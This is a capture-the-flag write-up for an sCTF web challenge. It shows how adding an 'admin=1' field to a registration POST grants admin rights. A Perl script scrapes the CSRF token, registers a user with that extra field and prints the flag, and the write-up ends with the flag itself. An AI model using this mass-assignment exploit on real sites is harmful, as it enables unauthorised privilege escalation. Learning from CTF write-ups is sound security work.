#Control Panel

Take control... of the flag on this [admin control panel](http://cpanel.sctf.michaelz.xyz/).

**Hint:** *There are more hints in the comments.*

## Getting an overview

We go to the site and browse about a bit, to see what we are dealing with. We got

1) The main page
2) Register / sign up page
3) Login page
4) Control Panel page (when logging in)

We check the out the source of the html for each page, the first page that has some interesting stuff, is the register page, we can see in the end it has a function called **register_form** and in the html we can see that the form have registered it as a callback when the form is submitted.

```
var register_form = function() {
  var disable = "input";
  $(disable).attr("disabled", "disabled");
  $.post("/api/user/register", {
    _csrf: "lyYp1wpK-I3KCeNoHwreYKYwz5tiCl65Hw8s",
    username: $("#username").val(),
    password: $("#password").val(),
  }, function(result) {
    display_message("#register_msg", (result.success == 1 ? "success" : "danger"), result.message, function() {
      if (result.success == 1) { location.href = "/account"; }
      else { $(disable).removeAttr("disabled"); }
    });
  });
};
```

From this function we can see that it post to the url /api/user/register and we can see it post the username, password and a random csrf value. (we can refresh the page and see it changes each time).

When your data has been posted to the server it return a json string indicating success of failure to create the new user. We can see that you get redirected to /account if your user got created.

We try to create an account and see what happens when we get redirected to /account.

A  new page we haven't seen before loads, with a message  **"No flag for you, you are not an admin"**, we check out the pages source and in the bottom we find the following

```
<!--
Error: user.admin is not equal to true.
{
	"_id": "570fa9861dd79e06001cd598",
	"username": "zylopfa9999",
	"password": "$2a$10$NgyVTlXpq4fARKAu92d8a.YBjB46ukNOTSZgHkgcCOkIYPl/9CF4W",
	"uid": "r1lfa4q3ofoab3hx35vswc7c6"
}
-->

```

Here user.admin likely refer to the table user and the column admin, in some sort of internal database, so we can deduct that username maps to user.username and password maps to user.password.

How could we set the admin to true, in a very badly designed system? Well we could try to post an additional key value pair: **"admin":1** to see if that could work.

With the ever changing csrf value, we need to make a program to solve this, perl to the rescue.

## Programming time

Basically our program will have to do the following

1) Load the registration page, and scrape off the csrf value, we need it when posting.
2) Send a POST request to the server endpoint, with the csrf,username,password and admin values.
3) Go to the /account page and check if we can find a flag!

We use perl to program this

```
#!/usr/bin/perl
use LWP;
use LWP::UserAgent;
use HTTP::Cookies;
use URI::Escape;

my $cookie_jar = HTTP::Cookies->new(
    agent => "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:27.0) Gecko/20100101 FireCow/27.0"
);

my $ua = LWP::UserAgent->new(
    ssl_opts   => { verify_hostname => 0 },
    cookie_jar => $cookie_jar,
);

push @{ $ua->requests_redirectable }, 'POST';

my $username="zylopfa" . rndStr (8, 'A'..'Z','a'..'z', 0..9);
my $csrf = "";

# get the csrf value
my $csrfpage = "http://cpanel.sctf.michaelz.xyz/register";
my $req = HTTP::Request->new(GET => "$csrfpage");
my $res = $ua->request($req);

if ( $res->content =~ /csrf: \"(.*?)\",/gis ) {
  $csrf =  $1;
}

# Registration using randomish username and password and the csrf value
my $page = "http://cpanel.sctf.michaelz.xyz/api/user/register";

$req = HTTP::Request->new(POST => "$page");
$req->header('Referer', 'http://cpanel.sctf.michaelz.xyz/register');
$req->content_type('application/x-www-form-urlencoded');
$req->content("_csrf=" . $csrf . "&username=" . $username . "&password=passw0rd0&admin=1");
$res = $ua->request($req);

# Go to the admin page and scrape the flag

my $adminpage = "http://cpanel.sctf.michaelz.xyz/account";
$req = HTTP::Request->new(GET => "$adminpage");
$res = $ua->request($req);

if ( $res->content =~ /(sctf{.*?})/gis ) {
  print $1 . "\n";
}

sub rndStr{ join'', @_[ map{ rand @_ } 1 .. shift ] }

```

The code if following the steps we outlined above and should be pretty explanatory. All we have to do now in order to find the flag is to execute the program.

`./solve.pl`

And we get the flag:

**sctf{TIL_noSql_cAn_bE_InjeKT3d_t0o}**
